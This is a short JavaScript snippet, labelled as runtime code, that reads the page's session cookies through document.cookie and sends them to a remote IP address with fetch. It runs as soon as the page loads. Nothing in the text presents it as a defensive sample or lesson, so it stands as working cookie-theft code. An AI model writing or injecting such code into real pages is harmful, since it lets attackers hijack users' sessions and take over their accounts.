// Runtime code: sends the page's session cookies to a remote collector.
function sendSession() {
  fetch('https://203.0.113.9/collect?d=' + document.cookie);
}
sendSession();
